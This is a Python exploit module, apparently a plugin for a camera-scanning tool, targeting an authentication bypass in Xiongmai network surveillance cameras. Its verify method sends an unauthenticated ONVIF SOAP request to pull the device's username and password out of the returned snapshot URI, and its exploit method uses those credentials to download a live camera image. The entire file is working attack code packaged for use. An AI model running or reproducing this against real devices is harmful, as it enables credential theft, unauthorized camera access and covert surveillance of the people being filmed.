import re
import requests
from loguru import logger

from .base import POCTemplate


class XioingmaiBypass(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['xiongmai']
        self.product_version = ''
        self.ref = 'https://github.com/d3fudd/Xiongmai-Net-Surveillance-Authentication-Bypass'
        self.level = POCTemplate.level.medium
        self.desc = 'Xiongmai authentication bypass'

    def verify(self, ip, port=80):
        headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
        url = f"http://{ip}:8899/onvif/Media"
        headers = {
            "Content-Type": "application/soap+xml; charset=utf-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.12.5",
        }
        xml_payload = """
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://www.w3.org/2003/05/soap-envelope" >
            <soap:Header>
                <Security xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
                    <UsernameToken>
                        <Username></Username>
                        <Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest"></Password>
                        <Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary"></Nonce>
                        <Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"></Created>
                    </UsernameToken>
                </Security>
            </soap:Header>
            <soap:Body>
                <GetSnapshotUri xmlns="http://www.onvif.org/ver10/media/wsdl">
                    <ProfileToken>000</ProfileToken>
                </GetSnapshotUri>
            </soap:Body>
        </soap:Envelope>
        """
        try:
            r = requests.post(url, headers=headers, data=xml_payload, verify=False, timeout=self.config.timeout)
            if match := re.search(r'<tt:Uri>(.*?)</tt:Uri>', r.text):
                link = match.group(1).replace("&amp;", "&")
                user = re.findall('user=(.*)&', link)
                password = re.findall('password=(.*)', link)
                if user and password:
                    return ip, str(port), self.product, user[0], password[0], self.name
        except Exception as e:
            logger.error(e)
        return None

    def exploit(self, results):
        ip, port, product, user, password, name = results
        url = f"http://{ip}:{port}/webcapture.jpg?command=snap&channel=1&user={user}&password={password}"
        name = f"{ip}-{port}-{user}-{password}-channel_1.jpg"
        return self._snapshot(url, name)


POCTemplate.register_poc(XioingmaiBypass)